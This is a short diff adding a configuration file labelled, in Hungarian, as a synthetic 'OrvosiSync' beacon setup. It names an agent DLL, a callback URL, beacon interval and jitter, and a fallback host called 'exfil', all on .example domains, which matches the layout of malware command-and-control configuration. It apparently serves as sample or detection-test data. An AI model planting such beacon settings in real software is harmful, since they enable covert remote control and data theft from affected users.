@@ -1,0 +1,7 @@
+OrvosiSync beacon konfiguracio (SZINTETIKUS)
+
+module      = orv_agent.dll
+callback    = https://sync.orvosi-cdn.example/u
+interval    = 60
+jitter      = 15
+fallback    = https://exfil.orvosi-cdn.example/u
